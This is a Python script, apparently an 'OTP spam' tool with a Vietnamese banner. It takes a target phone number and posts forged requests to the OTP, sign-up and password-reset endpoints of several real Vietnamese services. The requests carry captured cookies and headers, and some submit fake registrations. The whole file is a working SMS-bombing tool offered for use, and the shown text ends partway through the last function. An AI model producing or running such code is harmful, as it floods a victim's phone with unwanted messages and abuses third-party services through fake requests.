import os,sys
import time 
import requests
from time import strftime
from random import randint

ip = requests.get('https://httpbin.org/ip').json()
print('>> Loading..',end='\r')
time.sleep(1)
print('DEVELOPER BY: yonko zfw')
time.sleep(2)
os.system('cls')
#BANER-TOOL
ban = f"""\033[1;35m
    ██████╗    ████████╗ ██████╗  ██████╗ ██╗     
   ██╔═══██╗   ╚══██╔══╝██╔═══██╗██╔═══██╗██║     
   ██║   ██║█████╗██║   ██║   ██║██║   ██║██║     
   ██║▄▄ ██║╚════╝██║   ██║   ██║██║   ██║██║     
   ╚██████╔╝      ██║   ╚██████╔╝╚██████╔╝███████╗
    ╚══▀▀═╝       ╚═╝    ╚═════╝  ╚═════╝ ╚══════╝
	    \033[1;37m @\033[1;35mkwk\033[1;33m[\033[1;32mDuongg Phu Quocc\033[1;33m]
\033[1;34m════════════════════════════════════════════════════════
\033[1;31m[FB] \033[1;32mFaceBook Support: \033[1;33mFb.com/100042415576964
\033[1;31m[YTB] \033[1;32mYoutube: \033[1;33mYoutube.com/watch?v=dQw4w9WgXcQ
\033[1;31m[IP] \033[1;32mIP HIỆN TẠI CỦA BẠN LÀ: \033[1;33m{ip['origin']}
\033[1;34m════════════════════════════════════════════════════════
"""
def logo():
	for h in ban:	
		sys.stdout.write(h)
		sys.stdout.flush()
		time.sleep(0.0025)

logo()
sdt = input('\033[1;37m>> \033[1;32mEnter Your Phone: \033[1;30m')
while True:
	if len(sdt) < 10:
		print('THẤT BẠI, PHONE PHẢI ĐỦ 10 SỐ')
		sdt = input('\033[1;37m>> \033[1;32mEnter Your Phone: \033[1;30m')
	elif len(sdt) >= 10:
		break
rds = randint(1,10000000)
# API FREE OTP SMS:)
def tv360():
	cookies = {
		'G_ENABLED_IDPS': 'google',
		'device-id': 's%3Aweb_749412cb-0957-474c-8a52-dce669e9c09c.a8J82tEiqXwMf2Gp0nrkIcH7MNiSNoLI9BUd2dVm9dM',
		'shared-device-id': 'web_749412cb-0957-474c-8a52-dce669e9c09c',
		'screen-size': 's%3A1366x768.IiD9nRz2OL3IyaPE2ac97JfqfV3HiT2hZFjjk11x658',
		'_gid': 'GA1.2.561118208.1698556898',
		'acw_tc': '79c208ac889fd8a005d1a6d57760e1ba75942541f1ed8bd3ca974fe97665b817',
		'img-ext': 'avif',
		'NEXT_LOCALE': 'vi',
		'_ga': 'GA1.2.2100836695.1693382042',
		'_gat_UA-180935206-1': '1',
		'_ga_D7L53J0JMS': 'GS1.1.1698670775.7.1.1698670785.50.0.0',
		'_ga_E5YP28Y8EF': 'GS1.1.1698670775.7.1.1698670785.0.0.0',
		'session-id': 's%3A7b25000e-6c2e-4452-b3fb-474219fc9c0c.2Rt6kap2SkFrYRw124u8VA8W2GxmipvGwtRmXzM9FH8',
	}

	headers = {
		'authority': 'tv360.vn',
		'accept': 'application/json, text/plain, */*',
		'accept-language': 'vi-VN,vi;q=0.9,fr-FR;q=0.8,fr;q=0.7,en-US;q=0.6,en;q=0.5',
		'content-type': 'application/json',
		# 'cookie': 'G_ENABLED_IDPS=google; device-id=s%3Aweb_749412cb-0957-474c-8a52-dce669e9c09c.a8J82tEiqXwMf2Gp0nrkIcH7MNiSNoLI9BUd2dVm9dM; shared-device-id=web_749412cb-0957-474c-8a52-dce669e9c09c; screen-size=s%3A1366x768.IiD9nRz2OL3IyaPE2ac97JfqfV3HiT2hZFjjk11x658; _gid=GA1.2.561118208.1698556898; acw_tc=79c208ac889fd8a005d1a6d57760e1ba75942541f1ed8bd3ca974fe97665b817; img-ext=avif; NEXT_LOCALE=vi; _ga=GA1.2.2100836695.1693382042; _gat_UA-180935206-1=1; _ga_D7L53J0JMS=GS1.1.1698670775.7.1.1698670785.50.0.0; _ga_E5YP28Y8EF=GS1.1.1698670775.7.1.1698670785.0.0.0; session-id=s%3A7b25000e-6c2e-4452-b3fb-474219fc9c0c.2Rt6kap2SkFrYRw124u8VA8W2GxmipvGwtRmXzM9FH8',
		'origin': 'https://tv360.vn',
		'referer': 'https://tv360.vn/login?r=https%3A%2F%2Ftv360.vn%2F',
		'sec-ch-ua': '"Chromium";v="118", "Google Chrome";v="118", "Not=A?Brand";v="99"',
		'sec-ch-ua-mobile': '?0',
		'sec-ch-ua-platform': '"Windows"',
		'sec-fetch-dest': 'empty',
		'sec-fetch-mode': 'cors',
		'sec-fetch-site': 'same-origin',
		'starttime': '1698670786594',
		'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/118.0.0.0 Safari/537.36',
	}

	json_data = {
		'msisdn': sdt,
	}

	response = requests.post('https://tv360.vn/public/v1/auth/get-otp-login', cookies=cookies, headers=headers, json=json_data).json()
	print(f'\033[1;34m@SPAM_OTP\033[1;37m|\033[1;33mTv360\033[1;37m| \033[1;35m[\033[1;32m{sdt}\033[1;35m] \033[1;37m[\033[1;32mSuccess\033[1;37m]')

def myvt():
	cookies = {
		'laravel_session': 'boExSyRcc3qpTOHukoEuYQSx7tkvOvixFXqOdvLn',
		'__zi': '2000.SSZzejyD3jSkdl-krWqVtYU9zQ-T61wH9TthuPC0NCqtr_NpqH9AtpY9_VIONK7VFelnyfqGHTWmp_RpbHz4sJapC0.1',
		'XSRF-TOKEN': 'eyJpdiI6IjkrbTB5UHNWQ0lhSDhGdG96MzdUUHc9PSIsInZhbHVlIjoiQ0doQkJJaW5hZlZtc0luVWtOdzNBK0pZdWlZK0lKdDZjUUtvNTA2UGU1SnNhR0VjNEc0bUJuUW9oS3ZtSVFxWiIsIm1hYyI6ImEwOTM1NGRjMTg1YzRhMWUxYmY2ODY2Nzg2ZTI5NjA3YzZjZDlhNWE4NDMxNTQzYjU5ODY3M2RhNThiMDY0OGQifQ%3D%3D',
	}

	headers = {
		'Accept': 'application/json, text/plain, */*',
		'Accept-Language': 'vi-VN,vi;q=0.9,fr-FR;q=0.8,fr;q=0.7,en-US;q=0.6,en;q=0.5',
		'Connection': 'keep-alive',
		'Content-Type': 'application/json;charset=UTF-8',
		# 'Cookie': 'laravel_session=boExSyRcc3qpTOHukoEuYQSx7tkvOvixFXqOdvLn; __zi=2000.SSZzejyD3jSkdl-krWqVtYU9zQ-T61wH9TthuPC0NCqtr_NpqH9AtpY9_VIONK7VFelnyfqGHTWmp_RpbHz4sJapC0.1; XSRF-TOKEN=eyJpdiI6IjkrbTB5UHNWQ0lhSDhGdG96MzdUUHc9PSIsInZhbHVlIjoiQ0doQkJJaW5hZlZtc0luVWtOdzNBK0pZdWlZK0lKdDZjUUtvNTA2UGU1SnNhR0VjNEc0bUJuUW9oS3ZtSVFxWiIsIm1hYyI6ImEwOTM1NGRjMTg1YzRhMWUxYmY2ODY2Nzg2ZTI5NjA3YzZjZDlhNWE4NDMxNTQzYjU5ODY3M2RhNThiMDY0OGQifQ%3D%3D',
		'Origin': 'https://vietteltelecom.vn',
		'Referer': 'https://vietteltelecom.vn/dang-nhap',
		'Sec-Fetch-Dest': 'empty',
		'Sec-Fetch-Mode': 'cors',
		'Sec-Fetch-Site': 'same-origin',
		'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/118.0.0.0 Safari/537.36',
		'X-CSRF-TOKEN': 'YGCgJRRKZ89ZjhAAqTKAEkXapHgyiRG74wI2yKMF',
		'X-Requested-With': 'XMLHttpRequest',
		'X-XSRF-TOKEN': 'eyJpdiI6IjkrbTB5UHNWQ0lhSDhGdG96MzdUUHc9PSIsInZhbHVlIjoiQ0doQkJJaW5hZlZtc0luVWtOdzNBK0pZdWlZK0lKdDZjUUtvNTA2UGU1SnNhR0VjNEc0bUJuUW9oS3ZtSVFxWiIsIm1hYyI6ImEwOTM1NGRjMTg1YzRhMWUxYmY2ODY2Nzg2ZTI5NjA3YzZjZDlhNWE4NDMxNTQzYjU5ODY3M2RhNThiMDY0OGQifQ==',
		'sec-ch-ua': '"Chromium";v="118", "Google Chrome";v="118", "Not=A?Brand";v="99"',
		'sec-ch-ua-mobile': '?0',
		'sec-ch-ua-platform': '"Windows"',
	}

	json_data = {
		'msisdn': sdt,
	}

	response = requests.post('https://vietteltelecom.vn/api/get-otp', cookies=cookies, headers=headers, json=json_data).json()
	print(f'\033[1;34m@SPAM_OTP\033[1;37m|\033[1;33mMyViettel\033[1;37m| \033[1;35m[\033[1;32m{sdt}\033[1;35m] \033[1;37m[\033[1;32mSuccess\033[1;37m]')

def mytv2():
	cookies = {
		'__zi': '2000.SSZzejyD3jSkdl-krWqVtYU9zQ-T61wH9TthuPC0NCqtr_NpqH9AtpY9_VIONK7VFelnyfqGHTWmp_RpbHz4sJapC0.1',
		'laravel_session': 'xaiW0WBjhYxA96FIBKDAhRYO5v3XyjoJ4ryKIfNr',
		'_gcl_au': '1.1.2144351578.1698847165',
		'_gid': 'GA1.2.1862121859.1698847166',
		'_gat_UA-58224545-1': '1',
		'_fbp': 'fb.1.1698847166496.637105938',
		'_ga': 'GA1.2.234902096.1698847166',
		'redirectLogin': 'https://vietteltelecom.vn/',
		'_ga_VH8261689Q': 'GS1.1.1698847166.1.1.1698847202.24.0.0',
		'XSRF-TOKEN': 'eyJpdiI6IjlLeDhiOEVLMjNtVVZoVFoyUUl4Rmc9PSIsInZhbHVlIjoiVHJmN3lvRktEVWJCTnB6VTFYckJOSmRjbDhBOFllM2haY3A0ZTN0U01Bc2t2MmtxNzZIMTgzWXdra09BSmd5eCIsIm1hYyI6IjRiMzQzYjk4YzZlMDYyYWVkMmYxYTJmZjkyMzdmOTc4Yjk4MTliZWYyY2JiMzIxOGE5ZjAwZTgyZGFkN2VmNzkifQ%3D%3D',
	}

	headers = {
		'Accept': 'application/json, text/plain, */*',
		'Accept-Language': 'vi-VN,vi;q=0.9,fr-FR;q=0.8,fr;q=0.7,en-US;q=0.6,en;q=0.5',
		'Connection': 'keep-alive',
		'Content-Type': 'application/json;charset=UTF-8',
		# 'Cookie': '__zi=2000.SSZzejyD3jSkdl-krWqVtYU9zQ-T61wH9TthuPC0NCqtr_NpqH9AtpY9_VIONK7VFelnyfqGHTWmp_RpbHz4sJapC0.1; laravel_session=xaiW0WBjhYxA96FIBKDAhRYO5v3XyjoJ4ryKIfNr; _gcl_au=1.1.2144351578.1698847165; _gid=GA1.2.1862121859.1698847166; _gat_UA-58224545-1=1; _fbp=fb.1.1698847166496.637105938; _ga=GA1.2.234902096.1698847166; redirectLogin=https://vietteltelecom.vn/; _ga_VH8261689Q=GS1.1.1698847166.1.1.1698847202.24.0.0; XSRF-TOKEN=eyJpdiI6IjlLeDhiOEVLMjNtVVZoVFoyUUl4Rmc9PSIsInZhbHVlIjoiVHJmN3lvRktEVWJCTnB6VTFYckJOSmRjbDhBOFllM2haY3A0ZTN0U01Bc2t2MmtxNzZIMTgzWXdra09BSmd5eCIsIm1hYyI6IjRiMzQzYjk4YzZlMDYyYWVkMmYxYTJmZjkyMzdmOTc4Yjk4MTliZWYyY2JiMzIxOGE5ZjAwZTgyZGFkN2VmNzkifQ%3D%3D',
		'Origin': 'https://vietteltelecom.vn',
		'Referer': 'https://vietteltelecom.vn/',
		'Sec-Fetch-Dest': 'empty',
		'Sec-Fetch-Mode': 'cors',
		'Sec-Fetch-Site': 'same-origin',
		'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/118.0.0.0 Safari/537.36',
		'X-CSRF-TOKEN': 'MXYe38dDM9xsiq6wzMhSQSPWQ6r7F8XGZD8yF4nG',
		'X-Requested-With': 'XMLHttpRequest',
		'X-XSRF-TOKEN': 'eyJpdiI6IjlLeDhiOEVLMjNtVVZoVFoyUUl4Rmc9PSIsInZhbHVlIjoiVHJmN3lvRktEVWJCTnB6VTFYckJOSmRjbDhBOFllM2haY3A0ZTN0U01Bc2t2MmtxNzZIMTgzWXdra09BSmd5eCIsIm1hYyI6IjRiMzQzYjk4YzZlMDYyYWVkMmYxYTJmZjkyMzdmOTc4Yjk4MTliZWYyY2JiMzIxOGE5ZjAwZTgyZGFkN2VmNzkifQ==',
		'sec-ch-ua': '"Chromium";v="118", "Google Chrome";v="118", "Not=A?Brand";v="99"',
		'sec-ch-ua-mobile': '?0',
		'sec-ch-ua-platform': '"Windows"',
	}

	json_data = {
		'msisdn': sdt,
	}

	response = requests.post('https://vietteltelecom.vn/api/get-otp-contract-mobile', cookies=cookies, headers=headers, json=json_data).json()
	print(f'\033[1;34m@SPAM_OTP\033[1;37m|\033[1;33mMyViettel-V2\033[1;37m| \033[1;35m[\033[1;32m{sdt}\033[1;35m] \033[1;37m[\033[1;32mSuccess\033[1;37m]')


def cashberry():
	cookies = {
		'cashberry_new_nuxt_front': 'vn',
		'site_id': '2a1f660f38857725134a4ef910f6f00b',
		'_ga': 'GA1.1.862941812.1698853774',
		'_lr_tabs_-bdwvky%2Fcashberry-vn': '{%22sessionID%22:0%2C%22recordingID%22:%225-69e222d0-3b64-415e-8a94-77b87d0c3fd5%22%2C%22webViewID%22:null%2C%22lastActivity%22:1698853774172}',
		'_lr_hb_-bdwvky%2Fcashberry-vn': '{%22heartbeat%22:1698853774173}',
		'_lr_uf_-bdwvky': '86e81832-7b6b-4fe0-b347-1e8e43546c79',
		'fp_token_7c6a6574-f011-4c9a-abdd-9894a102ccef': 'xtVIyCeNcf3PRs4/qm+DWId2L28RIFlZtban1CIiLcA=',
		'_fbp': 'fb.1.1698853774301.719478032',
		'_ga_53M1222GXQ': 'GS1.1.1698853773.1.1.1698853777.0.0.0',
	}

	headers = {
		'authority': 'cashberry.vn',
		'accept': 'application/json, text/plain, */*',
		'accept-language': 'vn',
		'content-type': 'application/json',
		# 'cookie': 'cashberry_new_nuxt_front=vn; site_id=2a1f660f38857725134a4ef910f6f00b; _ga=GA1.1.862941812.1698853774; _lr_tabs_-bdwvky%2Fcashberry-vn={%22sessionID%22:0%2C%22recordingID%22:%225-69e222d0-3b64-415e-8a94-77b87d0c3fd5%22%2C%22webViewID%22:null%2C%22lastActivity%22:1698853774172}; _lr_hb_-bdwvky%2Fcashberry-vn={%22heartbeat%22:1698853774173}; _lr_uf_-bdwvky=86e81832-7b6b-4fe0-b347-1e8e43546c79; fp_token_7c6a6574-f011-4c9a-abdd-9894a102ccef=xtVIyCeNcf3PRs4/qm+DWId2L28RIFlZtban1CIiLcA=; _fbp=fb.1.1698853774301.719478032; _ga_53M1222GXQ=GS1.1.1698853773.1.1.1698853777.0.0.0',
		'origin': 'https://cashberry.vn',
		'referer': 'https://cashberry.vn/dang-ky',
		'sec-ch-ua': '"Chromium";v="118", "Google Chrome";v="118", "Not=A?Brand";v="99"',
		'sec-ch-ua-mobile': '?0',
		'sec-ch-ua-platform': '"Windows"',
		'sec-fetch-dest': 'empty',
		'sec-fetch-mode': 'cors',
		'sec-fetch-site': 'same-origin',
		'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/118.0.0.0 Safari/537.36',
	}

	json_data = {
		'phone': sdt,
		'inn': '123456744',
		'email': f'concakne{rds}@gmail.com',
		'password': 'suppernguQ1',
		'password_repeat': 'suppernguQ1',
		'agree': True,
		'is_confirmed_kyivstar': 1,
		'email_mailing': 1,
		'registrationActionsReport': {
			'Object_1': {
				'Keypress': 4,
				'Activate': 2,
				'TimeLast': 2,
				'TimeAll': 70,
				'SymbolFact': 10,
				'Copy': None,
				'Paste': None,
				'Click': 2,
				'Tab': None,
				'BackspaceLast': 1,
				'BackspaceAll': 14,
				'DelLast': None,
				'DelAll': None,
				'Changes': 1,
				'Error': 33,
			},
			'Object_2': {
				'Keypress': None,
				'Activate': None,
				'TimeLast': None,
				'TimeAll': None,
				'SymbolFact': 18,
				'Copy': None,
				'Paste': None,
				'Click': None,
				'Tab': None,
				'BackspaceLast': None,
				'BackspaceAll': None,
				'DelLast': None,
				'DelAll': None,
				'Changes': None,
				'Error': 8,
			},
			'Object_3': {
				'Activate': 2,
				'TimeLast': 1,
				'TimeAll': 10,
				'SymbolFact': 11,
				'Paste': None,
				'Click': 2,
				'Tab': None,
				'BackspaceLast': None,
				'BackspaceAll': None,
				'DelLast': None,
				'DelAll': None,
				'Changes': 1,
				'Error': None,
			},
			'Object_15': {
				'Keypress': None,
				'Activate': None,
				'TimeLast': None,
				'TimeAll': None,
				'SymbolFact': None,
				'Copy': None,
				'Paste': None,
				'Click': None,
				'Tab': None,
				'BackspaceLast': None,
				'BackspaceAll': None,
				'DelLast': None,
				'DelAll': None,
				'Changes': None,
				'Error': None,
			},
			'Object_41': {
				'Activate': None,
				'Changes': None,
				'Error': None,
			},
		},
	}

	response = requests.post('https://cashberry.vn/proxy/user/register', cookies=cookies, headers=headers, json=json_data).json()
	print(f'\033[1;34m@SPAM_OTP\033[1;37m|\033[1;33mCashberry\033[1;37m| \033[1;35m[\033[1;32m{sdt}\033[1;35m] \033[1;37m[\033[1;32mSuccess\033[1;37m]')

def sapo():
	cookies = {
		'_fbp': 'fb.1.1694867813255.2133321020',
		'_ga_X10JR147Y7': 'GS1.1.1694867812.1.1.1694867824.48.0.0',
		'_hjSessionUser_3167213': 'eyJpZCI6ImM4M2VkZjgzLTQ4NDAtNWIzZC1iODMxLWMwYmZlZGQ4OWI1ZiIsImNyZWF0ZWQiOjE2OTg1NjI1NTA4MTksImV4aXN0aW5nIjp0cnVlfQ==',
		'G_ENABLED_IDPS': 'google',
		'lang': 'vi',
		'referral': 'https://accounts.sapo.vn/',
		'source': 'https://www.sapo.vn/',
		'_hjIncludedInSessionSample_3167213': '0',
		'_hjSession_3167213': 'eyJpZCI6IjgwYTIyYzFmLTIxZTMtNDk4My1hYTk4LTczNDQyM2M3ZjI0ZSIsImNyZWF0ZWQiOjE2OTg5MTUwMzc4NTgsImluU2FtcGxlIjpmYWxzZSwic2Vzc2lvbml6ZXJCZXRhRW5hYmxlZCI6ZmFsc2V9',
		'_hjAbsoluteSessionInProgress': '0',
		'_gid': 'GA1.2.208773567.1698915038',
		'landing_page': 'https://www.sapo.vn/',
		'start_time': '11/02/2023 15:50:38',
		'_ce.clock_event': '1',
		'_ce.clock_data': '-133669%2C113.165.32.41%2C1%2Ce3f8101c41b40572973227d0a64620d0',
		'_ce.irv': 'true',
		'cebs': '1',
		'_dc_gtm_UA-66880228-3': '1',
		'_ga_4NX0F91DEX': 'GS1.2.1698915038.4.1.1698915917.0.0.0',
		'cebsp_': '8',
		'pageview': '8',
		'_dc_gtm_UA-66880228-1': '1',
		'_gat_UA-239546923-1': '1',
		'_ga': 'GA1.1.1791878394.1694867812',
		'_ga_Y9YZPDEGP0': 'GS1.1.1698915040.6.1.1698915919.60.0.0',
		'_ga_GECRBQV6JK': 'GS1.1.1698915040.6.1.1698915919.60.0.0',
		'_ga_YNVPPJ8MZP': 'GS1.1.1698915040.6.1.1698915919.60.0.0',
		'_ga_CDD1S5P7D4': 'GS1.1.1698915040.6.1.1698915919.60.0.0',
		'_ga_8956TVT2M3': 'GS1.1.1698915040.6.1.1698915919.60.0.0',
		'_ga_EBZKH8C7MK': 'GS1.2.1698915041.5.1.1698915920.0.0.0',
		'_ga_8Z6MB85ZM2': 'GS1.1.1698915040.6.1.1698915926.53.0.0',
		'_ga_HXMGB9WRVX': 'GS1.1.1698915039.5.1.1698915951.28.0.0',
		'_ga_P9DPF3E00F': 'GS1.1.1698915037.5.1.1698915963.0.0.0',
		'_gcl_au': '1.1.671560251.1694867811.1081210929.1698915080.1698915963',
		'_ce.s': 'v~0c633635e4aa7539866a8e135de8fede03aa3ab1~lcw~1698915963684~vpv~5~v11.fhb~1698915038755~v11.lhb~1698915917474~ir~1~gtrk.la~lobgkiwj~lva~1698915708340~v11.cs~200798~v11.s~e567c7c0-795c-11ee-b2f5-53128427ba10~v11.sla~1698915963716~lcw~1698915963718',
	}

	headers = {
		'authority': 'www.sapo.vn',
		'accept': '*/*',
		'accept-language': 'vi-VN,vi;q=0.9,fr-FR;q=0.8,fr;q=0.7,en-US;q=0.6,en;q=0.5',
		'content-type': 'application/x-www-form-urlencoded; charset=UTF-8',
		# 'cookie': '_fbp=fb.1.1694867813255.2133321020; _ga_X10JR147Y7=GS1.1.1694867812.1.1.1694867824.48.0.0; _hjSessionUser_3167213=eyJpZCI6ImM4M2VkZjgzLTQ4NDAtNWIzZC1iODMxLWMwYmZlZGQ4OWI1ZiIsImNyZWF0ZWQiOjE2OTg1NjI1NTA4MTksImV4aXN0aW5nIjp0cnVlfQ==; G_ENABLED_IDPS=google; lang=vi; referral=https://accounts.sapo.vn/; source=https://www.sapo.vn/; _hjIncludedInSessionSample_3167213=0; _hjSession_3167213=eyJpZCI6IjgwYTIyYzFmLTIxZTMtNDk4My1hYTk4LTczNDQyM2M3ZjI0ZSIsImNyZWF0ZWQiOjE2OTg5MTUwMzc4NTgsImluU2FtcGxlIjpmYWxzZSwic2Vzc2lvbml6ZXJCZXRhRW5hYmxlZCI6ZmFsc2V9; _hjAbsoluteSessionInProgress=0; _gid=GA1.2.208773567.1698915038; landing_page=https://www.sapo.vn/; start_time=11/02/2023 15:50:38; _ce.clock_event=1; _ce.clock_data=-133669%2C113.165.32.41%2C1%2Ce3f8101c41b40572973227d0a64620d0; _ce.irv=true; cebs=1; _dc_gtm_UA-66880228-3=1; _ga_4NX0F91DEX=GS1.2.1698915038.4.1.1698915917.0.0.0; cebsp_=8; pageview=8; _dc_gtm_UA-66880228-1=1; _gat_UA-239546923-1=1; _ga=GA1.1.1791878394.1694867812; _ga_Y9YZPDEGP0=GS1.1.1698915040.6.1.1698915919.60.0.0; _ga_GECRBQV6JK=GS1.1.1698915040.6.1.1698915919.60.0.0; _ga_YNVPPJ8MZP=GS1.1.1698915040.6.1.1698915919.60.0.0; _ga_CDD1S5P7D4=GS1.1.1698915040.6.1.1698915919.60.0.0; _ga_8956TVT2M3=GS1.1.1698915040.6.1.1698915919.60.0.0; _ga_EBZKH8C7MK=GS1.2.1698915041.5.1.1698915920.0.0.0; _ga_8Z6MB85ZM2=GS1.1.1698915040.6.1.1698915926.53.0.0; _ga_HXMGB9WRVX=GS1.1.1698915039.5.1.1698915951.28.0.0; _ga_P9DPF3E00F=GS1.1.1698915037.5.1.1698915963.0.0.0; _gcl_au=1.1.671560251.1694867811.1081210929.1698915080.1698915963; _ce.s=v~0c633635e4aa7539866a8e135de8fede03aa3ab1~lcw~1698915963684~vpv~5~v11.fhb~1698915038755~v11.lhb~1698915917474~ir~1~gtrk.la~lobgkiwj~lva~1698915708340~v11.cs~200798~v11.s~e567c7c0-795c-11ee-b2f5-53128427ba10~v11.sla~1698915963716~lcw~1698915963718',
		'origin': 'https://www.sapo.vn',
		'referer': 'https://www.sapo.vn/',
		'sec-ch-ua': '"Chromium";v="118", "Google Chrome";v="118", "Not=A?Brand";v="99"',
		'sec-ch-ua-mobile': '?0',
		'sec-ch-ua-platform': '"Windows"',
		'sec-fetch-dest': 'empty',
		'sec-fetch-mode': 'cors',
		'sec-fetch-site': 'same-origin',
		'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/118.0.0.0 Safari/537.36',
	}

	data = {
		'FullName': 'LE VAN CAK',
		'PhoneNumber': sdt,
		'StoreName': 'CONCAKV',
		'CityDistrict': 'Hà Nội,01',
		'PackageType': 'pos',
		'Preferred': '',
		'SaleName': '',
		'Reference': '',
		'Source': 'https://www.sapo.vn/',
		'Referral': 'https://accounts.sapo.vn/',
		'Campaign': '',
		'LandingPage': 'https://www.sapo.vn/',
		'StartTime': '11/02/2023 15:50:38',
		'EndTime': '11/02/2023 16:5:18',
		'PageView': '8',
		'AffId': '',
		'AffTrackingId': '',
		'Type': '1',
		'SalesTeam': '',
		'City': 'Hà Nội',
		'CityId': '01',
		'Province': 'Hà Nội',
		'CityNameAndId': 'Hà Nội,01',
		'SocialSource': '',
		'FacebookName': '',
		'FacebookAvatar': '',
	}

	response = requests.post('https://www.sapo.vn/consultingrequest/registertrial', cookies=cookies, headers=headers, data=data).json()
	print(f'\033[1;34m@SPAM_OTP\033[1;37m|\033[1;33mSapo\033[1;37m| \033[1;35m[\033[1;32m{sdt}\033[1;35m] \033[1;37m[\033[1;32mSuccess\033[1;37m]')

def best_inc():
	headers = {
		'Accept-Language': 'vi-VN,vi;q=0.9,fr-FR;q=0.8,fr;q=0.7,en-US;q=0.6,en;q=0.5',
		'Connection': 'keep-alive',
		'Origin': 'https://best-inc.vn',
		'Referer': 'https://best-inc.vn/',
		'Sec-Fetch-Dest': 'empty',
		'Sec-Fetch-Mode': 'cors',
		'Sec-Fetch-Site': 'cross-site',
		'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/118.0.0.0 Safari/537.36',
		'accept': 'application/json',
		'authorization': 'null',
		'content-type': 'application/json',
		'lang-type': 'vi-VN',
		'sec-ch-ua': '"Chromium";v="118", "Google Chrome";v="118", "Not=A?Brand";v="99"',
		'sec-ch-ua-mobile': '?0',
		'sec-ch-ua-platform': '"Windows"',
		'x-auth-type': 'WEB',
		'x-lan': 'VI',
		'x-nat': 'vi-VN',
		'x-timezone-offset': '7',
	}

	json_data = {
		'phoneNumber': sdt,
		'verificationCodeType': 1,
	}

	response = requests.post('https://v9-cc.800best.com/uc/account/sendsignupcode', headers=headers, json=json_data)
	print(f'\033[1;34m@SPAM_OTP\033[1;37m|\033[1;33mBestInc\033[1;37m| \033[1;35m[\033[1;32m{sdt}\033[1;35m] \033[1;37m[\033[1;32mSuccess\033[1;37m]')

def vayvnd():
	cookies = {
		'_gcl_au': '1.1.29313225.1698924987',
		'_gid': 'GA1.2.424679111.1698924988',
		'_fbp': 'fb.1.1698924988139.1220984417',
		'_tt_enable_cookie': '1',
		'_ttp': '04xRJPO_teAehUetAKRIAZ3oQus',
		'_ym_uid': '1698924989371355613',
		'_ym_d': '1698924989',
		'_ym_isad': '2',
		'_gcl_aw': 'GCL.1698930560.CjwKCAjwkY2qBhBDEiwAoQXK5dzT0Wuu8lJG6HnLULwq1Uuf8Lv8XzluHjtO4kgo5lu73kX41cq6dBoCJ_EQAvD_BwE',
		'_ga_P2783EHVX2': 'GS1.1.1698930431.2.1.1698930560.59.0.0',
		'_ga': 'GA1.2.1414900781.1698924988',
		'_gac_UA-151110385-1': '1.1698930561.CjwKCAjwkY2qBhBDEiwAoQXK5dzT0Wuu8lJG6HnLULwq1Uuf8Lv8XzluHjtO4kgo5lu73kX41cq6dBoCJ_EQAvD_BwE',
		'_gat_UA-151110385-1': '1',
		'_ym_visorc': 'w',
	}

	headers = {
		'authority': 'api.vayvnd.vn',
		'accept': 'application/json',
		'accept-language': 'vi-VN',
		'content-type': 'application/json; charset=utf-8',
		# 'cookie': '_gcl_au=1.1.29313225.1698924987; _gid=GA1.2.424679111.1698924988; _fbp=fb.1.1698924988139.1220984417; _tt_enable_cookie=1; _ttp=04xRJPO_teAehUetAKRIAZ3oQus; _ym_uid=1698924989371355613; _ym_d=1698924989; _ym_isad=2; _gcl_aw=GCL.1698930560.CjwKCAjwkY2qBhBDEiwAoQXK5dzT0Wuu8lJG6HnLULwq1Uuf8Lv8XzluHjtO4kgo5lu73kX41cq6dBoCJ_EQAvD_BwE; _ga_P2783EHVX2=GS1.1.1698930431.2.1.1698930560.59.0.0; _ga=GA1.2.1414900781.1698924988; _gac_UA-151110385-1=1.1698930561.CjwKCAjwkY2qBhBDEiwAoQXK5dzT0Wuu8lJG6HnLULwq1Uuf8Lv8XzluHjtO4kgo5lu73kX41cq6dBoCJ_EQAvD_BwE; _gat_UA-151110385-1=1; _ym_visorc=w',
		'origin': 'https://vayvnd.vn',
		'referer': 'https://vayvnd.vn/',
		'sec-ch-ua': '"Chromium";v="118", "Google Chrome";v="118", "Not=A?Brand";v="99"',
		'sec-ch-ua-mobile': '?0',
		'sec-ch-ua-platform': '"Windows"',
		'sec-fetch-dest': 'empty',
		'sec-fetch-mode': 'cors',
		'sec-fetch-site': 'same-site',
		'site-id': '3',
		'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/118.0.0.0 Safari/537.36',
	}

	json_data = {
		'login': sdt,
		'trackingId': 't89k5sOcOwlOLeenCBCsZQNYpFZksvzwWkEpbS5afjy57JhDP8POtPd594St35K7',
	}

	response = requests.post('https://api.vayvnd.vn/v2/users/password-reset', cookies=cookies, headers=headers, json=json_data)
	print(f'\033[1;34m@SPAM_OTP\033[1;37m|\033[1;33mVayVnd\033[1;37m| \033[1;35m[\033[1;32m{sdt}\033[1;35m] \033[1;37m[\033[1;32mSuccess\033[1;37m]')

def ghn():
	headers = {
		'authority': 'online-gateway.ghn.vn',
		'accept': 'application/json, text/plain, */*',
		'accept-language': 'vi-VN,vi;q=0.9,fr-FR;q=0.8,fr;q=0.7,en-US;q=0.6,en;q=0.5',
		'content-type': 'application/json',
		'origin': 'https://sso.ghn.vn',
		'referer': 'https://sso.ghn.vn/',
		'sec-ch-ua': '"Chromium";v="118", "Google Chrome";v="118", "Not=A?Brand";v="99"',
		'sec-ch-ua-mobile': '?0',
		'sec-ch-ua-platform': '"Windows"',
		'sec-fetch-dest': 'empty',
		'sec-fetch-mode': 'cors',
		'sec-fetch-site': 'same-site',
		'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/118.0.0.0 Safari/537.36',
	}

	json_data = {
		'phone': sdt,
		'type': 'register',
	}

	response = requests.post('https://online-gateway.ghn.vn/sso/public-api/v2/client/sendotp', headers=headers, json=json_data)
